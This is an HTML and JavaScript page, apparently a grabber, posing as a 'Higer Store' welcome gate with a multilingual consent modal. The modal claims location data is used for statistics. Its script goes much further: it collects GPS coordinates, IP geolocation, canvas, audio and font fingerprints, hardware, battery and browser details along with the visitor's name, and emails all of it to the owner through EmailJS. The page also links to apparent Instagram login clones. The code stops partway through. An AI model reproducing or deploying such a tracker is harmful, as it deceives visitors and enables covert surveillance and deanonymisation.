<!doctype html>
<html lang="tr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Higer Store</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tone/14.7.77/Tone.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Cairo:wght@400;500;600;700&display=swap');
        
        html { scroll-behavior: smooth; }
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #0f172a; /* fallback */
            background-image: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
        }
        html[dir="rtl"] body { font-family: 'Cairo', sans-serif; }

        @keyframes fadeInScaleUp { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .animate-fade-in-scale-up { animation: fadeInScaleUp 0.3s ease-in-out forwards; }
        
        @keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        .animate-slide-in-right { animation: slideInRight 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards; }
        
        @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
        .animate-shake { animation: shake 0.5s ease-in-out; }

        @keyframes spin { to { transform: rotate(360deg); } }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.2); border-left-color: #818cf8; animation: spin 1s linear infinite; }
        
        #status-message { transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        
        .custom-scrollbar::-webkit-scrollbar { width: 8px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(30, 27, 75, 0.5); border-radius: 10px; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #6366f1; border-radius: 10px; border: 2px solid transparent; background-clip: content-box; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #818cf8; }
        .custom-scrollbar { scrollbar-width: thin; scrollbar-color: #6366f1 rgba(30, 27, 75, 0.5); }
        
        .lang-btn { opacity: 0.6; transition: opacity 0.2s ease-in-out; }
        .lang-btn.active, .lang-btn:hover { opacity: 1; transform: scale(1.1); }

        .link-button-icon { transition: transform 0.3s ease-in-out; }
        .link-button:hover .link-button-icon { transform: scale(1.2) rotate(-5deg); }
    </style>
</head>
<body class="text-gray-200">

    <div class="container mx-auto p-4 sm:p-8 text-center flex flex-col items-center justify-center min-h-screen">
        <h1 class="text-5xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 to-purple-400" data-translate-key="welcome_title">Hoş Geldiniz</h1>
        <p class="text-lg text-gray-400 mb-8" data-translate-key="welcome_subtitle">Lütfen devam etmek için bilgileri onaylayın.</p>
        <a href="https://t.me/code_unterstutzung" target="_blank" rel="noopener noreferrer" class="inline-flex items-center justify-center w-full max-w-md px-8 py-4 bg-sky-500 hover:bg-sky-600 text-white font-bold rounded-xl shadow-lg transition-transform transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-sky-400/50" data-translate-key="join_telegram">
            <i class="fab fa-telegram-plane text-2xl mr-3"></i> Telegram Grubumuza Katılın
        </a>
        <div id="link-buttons" class="w-full max-w-md mt-8"></div>
    </div>

    <div id="modal-backdrop" class="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
        <div id="modal-content" class="bg-gray-800/60 backdrop-blur-lg border border-gray-700 rounded-2xl shadow-2xl p-8 w-full max-w-md transform animate-fade-in-scale-up">
            <div class="flex justify-center mb-6">
                <div class="flex flex-wrap justify-center gap-x-3 gap-y-2 bg-gray-900/50 p-2 rounded-lg">
                    <button id="lang-tr" class="lang-btn font-semibold px-2">TR</button>
                    <button id="lang-de" class="lang-btn font-semibold px-2">DE</button>
                    <button id="lang-en" class="lang-btn font-semibold px-2">EN</button>
                    <button id="lang-fr" class="lang-btn font-semibold px-2">FR</button>
                    <button id="lang-es" class="lang-btn font-semibold px-2">ES</button>
                    <button id="lang-ar" class="lang-btn font-semibold px-2">AR</button>
                </div>
            </div>

            <h2 class="text-2xl font-bold text-center text-white mb-4" data-translate-key="modal_title">Bilgilendirme</h2>
            <p class="text-center text-gray-400 mb-6" data-translate-key="modal_text">Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.</p>
            <div class="mb-6 relative">
                <i class="fa-solid fa-user absolute left-4 top-1/2 -translate-y-1/2 text-gray-500"></i>
                <input type="text" id="visitor-name-input" class="w-full pl-12 pr-4 py-3 bg-gray-900/70 text-white border-2 border-gray-700 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition" data-translate-key="name_placeholder" placeholder="Adınızı giriniz...">
            </div>
            <div id="error-message" class="hidden text-center text-red-400 mb-4 font-semibold"></div>
            <div class="flex flex-col sm:flex-row justify-center gap-4">
                <button id="reject-btn" class="w-full px-6 py-3 bg-transparent hover:bg-gray-700/50 border-2 border-gray-600 text-white font-semibold rounded-lg shadow-md transition-all transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-gray-500" data-translate-key="reject_button">Reddet</button>
                <button id="accept-btn" class="w-full px-6 py-3 bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white font-semibold rounded-lg shadow-lg hover:shadow-indigo-500/40 transition-all transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-400" data-translate-key="accept_button">Kabul Et</button>
            </div>
        </div>
    </div>

    <div id="spinner-overlay" class="hidden fixed inset-0 bg-black/80 flex-col gap-4 flex items-center justify-center z-[60]">
        <div class="spinner w-16 h-16 rounded-full"></div>
        <p class="text-white text-lg font-semibold" data-translate-key="verifying_text">Doğrulanıyor...</p>
    </div>

    <div id="status-message" aria-live="polite" class="fixed bottom-5 right-5 p-4 rounded-lg text-white font-bold shadow-lg z-[70] opacity-0 transform translate-x-full pointer-events-none"></div>
    
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // --- SETTINGS ---
            const EMAILJS_SERVICE_ID = 'service_5uyhust';
            const EMAILJS_TEMPLATE_ID = 'template_5p9annp';
            const EMAILJS_PUBLIC_KEY = 'F5cGGWMEHBUJTYWe_';
            const startTime = new Date();

            // --- TRANSLATIONS ---
            const translations = {
                tr: { page_title: "Higer Mağazası", welcome_title: "Hoş Geldiniz", welcome_subtitle: "Lütfen devam etmek için bilgileri onaylayın.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Telegram Grubumuza Katılın', modal_title: "Bilgilendirme", modal_text: "Bu site, istatistik oluşturmak amacıyla konum verinizi kullanmak için izin ister. Devam etmek için lütfen adınızı girip onaylayın.", name_placeholder: "Adınızı giriniz...", reject_button: "Reddet", accept_button: "Kabul Et", error_must_accept: "Devam etmek için kabul etmelisiniz.", error_make_choice: "Lütfen bir seçim yapın.", error_enter_name: "Lütfen adınızı giriniz.", status_success: "Doğrulama başarılı. ✅", status_fail_send: "Doğrulama başarısız oldu. ❌", status_fail_critical: "Robot olmadığınız doğrulanamadı. Veri toplanamadı. ❌", status_fail_init: "Gönderim servisi başlatılamadı!", link_chess: "Satranç Oyunu", link_insta1: "Instagram Klon 1", link_pong: "Higer Pong Oyunu", link_insta2: "Instagram Klon 2", geo_unsupported: "API Desteklenmiyor", geo_denied: "Kullanıcı tarafından reddedildi", geo_unavailable: "Kullanılamıyor", gpu_fail: "Uzantı alınamadı", gpu_error: "Hata ile alınamadı", charging: "Şarj Oluyor", not_charging: "Şarj Olmuyor", yes: "Evet", no: "Hayır", unspecified: "Belirtilmemiş", direct_entry: "Doğrudan Giriş", verifying_text: "Doğrulanıyor..." },
                de: { page_title: "Higer Store", welcome_title: "Willkommen", welcome_subtitle: "Bitte bestätigen Sie die Informationen, um fortzufahren.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Tritt unserer Telegram-Gruppe bei', modal_title: "Information", modal_text: "Diese Website bittet um Erlaubnis, Ihre Standortdaten für statistische Zwecke zu verwenden. Bitte geben Sie Ihren Namen ein und bestätigen Sie, um fortzufahren.", name_placeholder: "Geben Sie Ihren Namen ein...", reject_button: "Ablehnen", accept_button: "Akzeptieren", error_must_accept: "Sie müssen akzeptieren, um fortzufahren.", error_make_choice: "Bitte treffen Sie eine Auswahl.", error_enter_name: "Bitte geben Sie Ihren Namen ein.", status_success: "Überprüfung erfolgreich. ✅", status_fail_send: "Überprüfung fehlgeschlagen. ❌", status_fail_critical: "Anti-Bot-Prüfung fehlgeschlagen. Daten konnten nicht erfasst werden. ❌", status_fail_init: "Sendeservice konnte nicht initialisiert werden!", link_chess: "Schachspiel", link_insta1: "Instagram Klon 1", link_pong: "Higer Pong Spiel", link_insta2: "Instagram Klon 2", geo_unsupported: "API nicht unterstützt", geo_denied: "Vom Benutzer abgelehnt", geo_unavailable: "Nicht verfügbar", gpu_fail: "Erweiterung konnte nicht abgerufen werden", gpu_error: "Fehler beim Abrufen", charging: "Wird geladen", not_charging: "Wird nicht geladen", yes: "Ja", no: "Nein", unspecified: "Nicht angegeben", direct_entry: "Direkter Zugriff", verifying_text: "Verifizierung..." },
                en: { page_title: "Higer Store", welcome_title: "Welcome", welcome_subtitle: "Please confirm the information to continue.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Join our Telegram Group', modal_title: "Information", modal_text: "This site requests permission to use your location data for statistical purposes. Please enter your name and confirm to continue.", name_placeholder: "Enter your name...", reject_button: "Reject", accept_button: "Accept", error_must_accept: "You must accept to continue.", error_make_choice: "Please make a selection.", error_enter_name: "Please enter your name.", status_success: "Verification successful. ✅", status_fail_send: "Verification failed. ❌", status_fail_critical: "Anti-bot check failed. Data could not be collected. ❌", status_fail_init: "Could not initialize sending service!", link_chess: "Chess Game", link_insta1: "Instagram Clone 1", link_pong: "Higer Pong Game", link_insta2: "Instagram Clone 2", geo_unsupported: "API Not Supported", geo_denied: "Denied by user", geo_unavailable: "Unavailable", gpu_fail: "Could not get extension", gpu_error: "Error retrieving", charging: "Charging", not_charging: "Not Charging", yes: "Yes", no: "No", unspecified: "Not specified", direct_entry: "Direct Entry", verifying_text: "Verifying..." },
                fr: { page_title: "Boutique Higer", welcome_title: "Bienvenue", welcome_subtitle: "Veuillez confirmer les informations pour continuer.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Rejoignez notre groupe Telegram', modal_title: "Information", modal_text: "Ce site demande la permission d'utiliser vos données de localisation à des fins statistiques. Veuillez entrer votre nom et confirmer pour continuer.", name_placeholder: "Entrez votre nom...", reject_button: "Rejeter", accept_button: "Accepter", error_must_accept: "Vous devez accepter pour continuer.", error_make_choice: "Veuillez faire une sélection.", error_enter_name: "Veuillez entrer votre nom.", status_success: "Vérification réussie. ✅", status_fail_send: "La vérification a échoué. ❌", status_fail_critical: "Échec de la vérification anti-robot. Les données n'ont pas pu être collectées. ❌", status_fail_init: "Le service d'envoi n'a pas pu être initialisé!", link_chess: "Jeu d'échecs", link_insta1: "Clone d'Instagram 1", link_pong: "Jeu de Pong Higer", link_insta2: "Clone d'Instagram 2", geo_unsupported: "API non prise en charge", geo_denied: "Refusé par l'utilisateur", geo_unavailable: "Indisponible", gpu_fail: "Impossible d'obtenir l'extension", gpu_error: "Erreur de récupération", charging: "En charge", not_charging: "Pas en charge", yes: "Oui", no: "Non", unspecified: "Non spécifié", direct_entry: "Entrée directe", verifying_text: "Vérification..." },
                es: { page_title: "Tienda Higer", welcome_title: "Bienvenido", welcome_subtitle: "Por favor, confirme la información para continuar.", join_telegram: '<i class="fab fa-telegram-plane text-2xl mr-3"></i> Únete a nuestro grupo de Telegram', modal_title: "Información", modal_text: "Este sitio solicita permiso para usar sus datos de ubicación con fines estadísticos. Por favor, ingrese su nombre y confirme para continuar.", name_placeholder: "Ingrese su nombre...", reject_button: "Rechazar", accept_button: "Aceptar", error_must_accept: "Debe aceptar para continuar.", error_make_choice: "Por favor, haga una selección.", error_enter_name: "Por favor, ingrese su nombre.", status_success: "Verificación exitosa. ✅", status_fail_send: "La verificación falló. ❌", status_fail_critical: "Falló la verificación anti-bot. No se pudieron recopilar los datos. ❌", status_fail_init: "¡No se pudo inicializar el servicio de envío!", link_chess: "Juego de Ajedrez", link_insta1: "Clon de Instagram 1", link_pong: "Juego de Pong Higer", link_insta2: "Clon de Instagram 2", geo_unsupported: "API no compatible", geo_denied: "Denegado por el usuario", geo_unavailable: "No disponible", gpu_fail: "No se pudo obtener la extensión", gpu_error: "Error al recuperar", charging: "Cargando", not_charging: "No está cargando", yes: "Sí", no: "No", unspecified: "No especificado", direct_entry: "Entrada directa", verifying_text: "Verificando..." },
                ar: { page_title: "متجر هايجر", welcome_title: "أهلاً وسهلاً", welcome_subtitle: "يرجى تأكيد المعلومات للمتابعة.", join_telegram: '<i class="fab fa-telegram-plane text-2xl ml-3"></i> انضم إلى مجموعة التليجرام', modal_title: "معلومات", modal_text: "يطلب هذا الموقع الإذن لاستخدام بيانات موقعك لأغراض إحصائية. يرجى إدخال اسمك والتأكيد للمتابعة.", name_placeholder: "أدخل اسمك...", reject_button: "رفض", accept_button: "قبول", error_must_accept: "يجب أن تقبل للمتابعة.", error_make_choice: "الرجاء تحديد اختيار.", error_enter_name: "الرجاء إدخال اسمك.", status_success: "تم التحقق بنجاح. ✅", status_fail_send: "فشل التحقق. ❌", status_fail_critical: "فشل التحقق من الروبوت. لم يتمكن من جمع البيانات. ❌", status_fail_init: "لم يتمكن من تهيئة خدمة الإرسال!", link_chess: "لعبة الشطرنج", link_insta1: "نسخة انستغرام 1", link_pong: "لعبة هيجر بونج", link_insta2: "نسخة انستغرام 2", geo_unsupported: "الواجهة البرمجية غير مدعومة", geo_denied: "رفض من قبل المستخدم", geo_unavailable: "غير متوفر", gpu_fail: "لا يمكن الحصول على الامتداد", gpu_error: "خطأ في الاسترداد", charging: "جاري الشحن", not_charging: "لا يشحن", yes: "نعم", no: "لا", unspecified: "غير محدد", direct_entry: "دخول مباشر", verifying_text: "يتم التحقق..." }
            };

            let currentLang = 'tr';

            // --- DOM ELEMENTS ---
            const modalBackdrop = document.getElementById('modal-backdrop');
            const modalContent = document.getElementById('modal-content');
            const acceptBtn = document.getElementById('accept-btn');
            const rejectBtn = document.getElementById('reject-btn');
            const errorMessage = document.getElementById('error-message');
            const spinnerOverlay = document.getElementById('spinner-overlay');
            const statusMessage = document.getElementById('status-message');
            const visitorNameInput = document.getElementById('visitor-name-input');
            const linkButtonsContainer = document.getElementById('link-buttons');

            // --- LANGUAGE AND UI FUNCTIONS ---
            const setLanguage = (lang) => {
                if (!translations[lang]) return;
                currentLang = lang;
                document.documentElement.lang = lang;
                localStorage.setItem('preferredLanguage', lang);
                document.documentElement.setAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr');
                
                document.querySelectorAll('[data-translate-key]').forEach(el => {
                    const key = el.getAttribute('data-translate-key');
                    const translation = translations[lang][key];
                    if (translation !== undefined) {
                        if (el.placeholder !== undefined) {
                            el.placeholder = translation;
                        }
                        el.innerHTML = translation;
                    }
                });
                document.title = translations[lang].page_title;
                generateLinkButtons();

                document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
                document.getElementById(`lang-${lang}`).classList.add('active');
            };

            // --- DYNAMIC BUTTON SYSTEM ---
            const links = [
                { key: "link_chess", url: "https://higer23.github.io/Chess/", date: "10.09.2025", icon: "fa-solid fa-chess-knight" },
                { key: "link_insta1", url: "https://higer23.github.io/Instaagram-Login/", date: "10.09.2025", icon: "fa-brands fa-instagram" },
                { key: "link_pong", url: "https://higer23.github.io/ponghig/", date: "10.09.2025", icon: "fa-solid fa-table-tennis-paddle-ball" },
                { key: "link_insta2", url: "https://higer23.github.io/Instagram/", date: "10.09.2025", icon: "fa-brands fa-instagram" }
            ];

            const generateLinkButtons = () => {
                if (!linkButtonsContainer) return;
                linkButtonsContainer.innerHTML = '';
                const fragment = document.createDocumentFragment();
                const scrollableDiv = document.createElement('div');
                scrollableDiv.className = 'max-h-[40vh] overflow-y-auto custom-scrollbar pr-2';
                links.slice().reverse().forEach(link => {
                    const button = document.createElement('a');
                    button.href = link.url;
                    button.target = '_blank';
                    button.rel = 'noopener noreferrer';
                    button.className = "link-button w-full flex items-center justify-between p-4 bg-indigo-900/50 hover:bg-indigo-900/80 border border-indigo-800 text-white rounded-xl shadow-lg transition-all transform hover:scale-105 focus:outline-none focus:ring-4 focus:ring-indigo-500/50 mb-4";
                    const title = translations[currentLang][link.key] || 'Link';
                    button.innerHTML = `
                        <div class="text-left">
                            <span class="text-lg font-semibold">${title}</span>
                            <span class="block text-xs text-gray-400 mt-1">${link.date}</span>
                        </div>
                        <i class="${link.icon} text-3xl text-indigo-400 link-button-icon"></i>`;
                    scrollableDiv.appendChild(button);
                });
                fragment.appendChild(scrollableDiv);
                linkButtonsContainer.appendChild(fragment);
            };

            // --- HELPER & SOUND FUNCTIONS ---
            const playSound = async (noteSequence) => { try { await Tone.start(); const synth = new Tone.Synth().toDestination(); const now = Tone.now(); noteSequence.forEach((note, i) => synth.triggerAttackRelease(note.note, note.duration, now + i * 0.15)); } catch (error) { console.warn("Could not play sound effect:", error); } };
            const shakeModal = (key) => { errorMessage.textContent = translations[currentLang][key]; errorMessage.classList.remove('hidden'); modalContent.classList.add('animate-shake'); setTimeout(() => modalContent.classList.remove('animate-shake'), 500); };
            const showStatusMessage = (key, isSuccess) => {
                const message = translations[currentLang][key];
                const icon = isSuccess ? '<i class="fa-solid fa-check-circle mr-3"></i>' : '<i class="fa-solid fa-xmark-circle mr-3"></i>';
                statusMessage.innerHTML = `${icon} ${message}`;
                statusMessage.className = `fixed bottom-5 right-5 flex items-center p-4 rounded-lg text-white font-bold shadow-2xl z-[70] transition-all duration-500 ${isSuccess ? 'bg-green-600' : 'bg-red-600'} animate-slide-in-right`;
                setTimeout(() => { statusMessage.style.opacity = '0'; statusMessage.style.transform = 'translateX(100%)'; }, 4000);
            };
            const NA = "N/A";
            const cyrb53 = (str, seed = 0) => { let h1 = 0xdeadbeef ^ seed, h2 = 0x41c6ce57 ^ seed; for (let i = 0, ch; i < str.length; i++) { ch = str.charCodeAt(i); h1 = Math.imul(h1 ^ ch, 2654435761); h2 = Math.imul(h2 ^ ch, 1597334677); } h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909); h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909); return 4294967296 * (2097151 & h2) + (h1 >>> 0); };

            // --- ADVANCED DATA COLLECTION FUNCTIONS ---
            const getFingerprints = async () => {
                const getCanvasFp = () => { try { const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const txt = 'abcdefghijklmnopqrstuvwxyz0123456789'; ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText(txt, 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText(txt, 4, 17); return cyrb53(canvas.toDataURL()); } catch (e) { return NA; } };
                const getAudioFp = async () => { try { const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100); const oscillator = audioCtx.createOscillator(); oscillator.type = "triangle"; oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime); const compressor = audioCtx.createDynamicsCompressor(); compressor.threshold.setValueAtTime(-50, audioCtx.currentTime); oscillator.connect(compressor); compressor.connect(audioCtx.destination); oscillator.start(0); const renderedBuffer = await audioCtx.startRendering(); const fingerprint = renderedBuffer.getChannelData(0).slice(4500, 5000).reduce((acc, val) => acc + Math.abs(val), 0).toString(); return cyrb53(fingerprint); } catch (e) { return NA; } };
                
                // **FIX for the 'mmmm' bug**: Use an off-screen container for font probing.
                const getFontsFp = () => {
                    const probeDiv = document.createElement('div');
                    probeDiv.style.position = 'absolute';
                    probeDiv.style.left = '-9999px';
                    probeDiv.style.top = '-9999px';
                    probeDiv.style.visibility = 'hidden';
                    document.body.appendChild(probeDiv);
                    
                    try {
                        const baseFonts = ['monospace', 'sans-serif', 'serif']; const testString = "mmmmmmmmmmlli"; const testSize = '72px';
                        const s = document.createElement("span"); s.style.fontSize = testSize; s.innerHTML = testString;
                        const defaultWidth = {}; const defaultHeight = {};
                        baseFonts.forEach(font => { s.style.fontFamily = font; probeDiv.appendChild(s); defaultWidth[font] = s.offsetWidth; defaultHeight[font] = s.offsetHeight; probeDiv.removeChild(s); });
                        const fontList = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
                        let availableFonts = fontList.filter(font => baseFonts.some(baseFont => { s.style.fontFamily = `${font},${baseFont}`; probeDiv.appendChild(s); const detected = s.offsetWidth !== defaultWidth[baseFont] || s.offsetHeight !== defaultHeight[baseFont]; probeDiv.removeChild(s); return detected; }));
                        return cyrb53(availableFonts.join(','));
                    } catch (e) { return NA; }
                    finally {
                        document.body.removeChild(probeDiv);
                    }
                };
                const [audio_fingerprint, canvas_fingerprint, fonts_hash] = await Promise.all([ getAudioFp(), getCanvasFp(), getFontsFp() ]);
                return { audio_fingerprint, canvas_fingerprint, fonts_hash };
            };
            const getGeolocationInfo = () => new Promise(resolve => { const fetchIpApi = async () => { try { const response = await fetch(`https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`); if (!response.ok) return { query: NA, status: 'fail', message: `HTTP error ${response.status}` }; return await response.json(); } catch (e) { return { query: NA, status: 'fail', message: 'Network request failed' }; } }; if (!navigator.geolocation) return resolve({ ip: NA, geolocation: translations[currentLang].geo_unsupported }); navigator.geolocation.getCurrentPosition( async pos => { const ipApiData = await fetchIpApi(); const fullGeoData = { PERMISSION: 'Granted', GPS_COORDS: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }, IP_API_DATA: ipApiData }; resolve({ ip: ipApiData.query, geolocation: JSON.stringify(fullGeoData, null, 2) }); }, async err => { const ipApiData = await fetchIpApi(); const fullGeoData = { PERMISSION: err.code === 1 ? translations[currentLang].geo_denied : translations[currentLang].geo_unavailable, IP_API_DATA: ipApiData }; resolve({ ip: ipApiData.query, geolocation: JSON.stringify(fullGeoData, null, 2) }); }, { timeout: 10000, enableHighAccuracy: true } ); });
            const getSystemInfo = async () => { const ua = navigator.userAgent || ''; let os = NA, browser = NA, engine = NA; if (/Windows/.test(ua)) os = "Windows"; else if (/Macintosh/.test(ua)) os = "macOS"; else if (/Linux/.test(ua)) os = "Linux"; else if (/Android/.test(ua)) os = "Android"; else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS"; const edgeMatch = ua.match(/Edg\/([\d.]+)/); const firefoxMatch = ua.match(/Firefox\/([\d.]+)/); const chromeMatch = ua.match(/Chrome\/([\d.]+)/); const safariMatch = ua.match(/Version\/([\d.]+).*Safari/); if (edgeMatch) { browser = `Edge ${edgeMatch[1]}`; engine = 'Blink'; } else if (chromeMatch) { browser = `Chrome ${chromeMatch[1]}`; engine = 'Blink'; } else if (firefoxMatch) { browser = `Firefox ${firefoxMatch[1]}`; engine = 'Gecko'; } else if (safariMatch) { browser = `Safari ${safariMatch[1]}`; engine = 'WebKit'; } let gpu = NA; try { const canvas = document.createElement('canvas'); const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); if (gl) { const ext = gl.getExtension('WEBGL_debug_renderer_info'); gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : translations[currentLang].gpu_fail; } } catch(e) { gpu = translations[currentLang].gpu_error; } let uad = { platform: NA, mobile: NA, brand: NA, model: NA }; if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') { try { Object.assign(uad, await navigator.userAgentData.getHighEntropyValues(["platform", "model", "brand", "uaFullVersion"])); } catch(e) { console.warn("Could not get high entropy values:", e); } } const conn = navigator.connection || null; return { os: `${os} (${uad.platform || navigator.platform || NA})`, device_platform: navigator.platform || NA, browser, browser_engine: engine, user_agent: ua, gpu_info: gpu, cpu_cores: navigator.hardwareConcurrency || NA, ram_gb: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : NA, plugins_list: (navigator.plugins ? Array.from(navigator.plugins) : []).map(p => p.name).join(', ') || NA, network_info: conn ? `${conn.effectiveType || NA}, Downlink: ${conn.downlink || NA} Mbps` : NA, user_agent_data: JSON.stringify(uad, null, 2), device_brand: uad.brand || NA, device_model: uad.model || NA }; };
            const getBehavioralInfo = () => { const s = window.screen; const gcd = (a, b) => b ? gcd(b, a % b) : a; const r = gcd(s.width, s.height); return { screen_resolution: `${s.width}x${s.height}`, aspect_ratio: `${s.width/r}:${s.height/r}`, color_pixel_depth: `${s.colorDepth} bit / ${s.pixelDepth} bit`, screen_orientation: s.orientation ? s.orientation.type : NA, navigator_languages: navigator.languages ? navigator.languages.join(', ') : NA, keyboard_layout: navigator.keyboard ? 'API Supported' : 'API Not Supported', do_not_track: navigator.doNotTrack || translations[currentLang].unspecified, pointer_support: window.matchMedia('(pointer: fine)').matches ? 'Mouse/Fine' : 'Coarse/Touch', touch_capable: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? translations[currentLang].yes : translations[currentLang].no, history_length: history.length, device_type: /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop/Tablet' }; };
            const getMiscInfo = async () => { let battery_status = NA, battery_charge_discharge_time = NA; if (navigator.getBattery && typeof navigator.getBattery === 'function') { try { const battery = await navigator.getBattery(); battery_status = `${Math.round(battery.level*100)}% (${battery.charging ? translations[currentLang].charging : translations[currentLang].not_charging})`; const chargeTime = isFinite(battery.chargingTime) ? `${battery.chargingTime/60}min` : NA; const dischargeTime = isFinite(battery.dischargingTime) ? `${battery.dischargingTime/60}min` : NA; battery_charge_discharge_time = `Charge: ${chargeTime}, Discharge: ${dischargeTime}`; } catch(e) {} } const adblock = await (async () => { try { await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", { method: 'HEAD', mode: 'no-cors', cache: 'no-store' }); return translations[currentLang].no; } catch (error) { return translations[currentLang].yes; } })(); const apis = { 'WebUSB': !!navigator.usb, 'WebBluetooth': !!navigator.bluetooth, 'WebXR': !!navigator.xr, 'Gamepad': !!navigator.getGamepads, 'WebRTC': !!window.RTCPeerConnection, 'WebAudio': !!(window.AudioContext || window.webkitAudioContext) }; const advanced_api_support = Object.entries(apis).filter(([_,v]) => v).map(([k,_]) => k).join(', ') || NA; return { battery_status, battery_charge_discharge_time, adblock_detected: adblock, sensor_support: ('DeviceMotionEvent' in window) ? translations[currentLang].yes : `${translations[currentLang].no}/Unknown`, advanced_api_support, referrer: document.referrer || translations[currentLang].direct_entry }; };
            const collectAllData = async () => { const promises=[getGeolocationInfo(),getFingerprints(),getSystemInfo(),getBehavioralInfo(),getMiscInfo()];const results=await Promise.allSettled(promises);const allData=results.reduce(((e,t)=>"fulfilled"===t.status&&t.value?{...e,...t.value}:e),{});return allData.timestamp=(new Date).toISOString(),allData.visit_duration=`${((new Date-startTime)/1e3).toFixed(2)} seconds`,["timestamp","visitor_name","ip","geolocation","canvas_fingerprint","audio_fingerprint","fonts_hash","device_type","device_brand","device_model","gpu_info","cpu_cores","ram_gb","battery_status","battery_charge_discharge_time","screen_resolution","aspect_ratio","color_pixel_depth","screen_orientation","sensor_support","os","device_platform","browser","browser_engine","user_agent","plugins_list","referrer","network_info","navigator_languages","keyboard_layout","adblock_detected","do_not_track","pointer_support","touch_capable","history_length","visit_duration","user_agent_data","advanced_api_support"].forEach((e=>{allData[e]||(allData[e]=NA)})),allData};

            const sendData = async (params) => {
                spinnerOverlay.classList.remove('hidden');
                try {
                    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
                    showStatusMessage("status_success", true);
                } catch (error) {
                    console.error("EmailJS send failed:", error);
                    showStatusMessage("status_fail_send", false);
                } finally {
                    spinnerOverlay.classList.add('hidden');
                }
            };

            // --- EVENT LISTENERS ---
            rejectBtn.addEventListener('click', () => { playSound([{note: "C3", duration: "8n"}]); shakeModal("error_must_accept"); });
            modalBackdrop.addEventListener('click', (event) => { if (event.target === modalBackdrop) { playSound([{note: "C3", duration: "8n"}]); shakeModal("error_make_choice"); } });
            
            document.querySelectorAll('.lang-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    const lang = e.target.id.split('-')[1];
                    setLanguage(lang);
                });
            });

            acceptBtn.addEventListener('click', async () => {
                const visitorName = visitorNameInput.value.trim();
                if (!visitorName) {
                    playSound([{note: "C3", duration: "8n"}]);
                    shakeModal("error_enter_name");
                    return;
                }
                errorMessage.classList.add('hidden');
                playSound([{note: "C4", duration: "8n"}, {note: "E4", duration: "8n"}, {note: "G4", duration: "8n"}]);
                modalBackdrop.classList.add('hidden');
                spinnerOverlay.classList.remove('hidden');

                try {
                    const data = await collectAllData();
                    data.visitor_name = visitorName;
                    await sendData(data);
                } catch (error) {
                    console.error("Critical error during data collection:", error);
                    showStatusMessage("status_fail_critical", false);
                } finally {
                    spinnerOverlay.classList.add('hidden');
                }
            });

            // --- INITIALIZATION ---
            const initialize = () => {
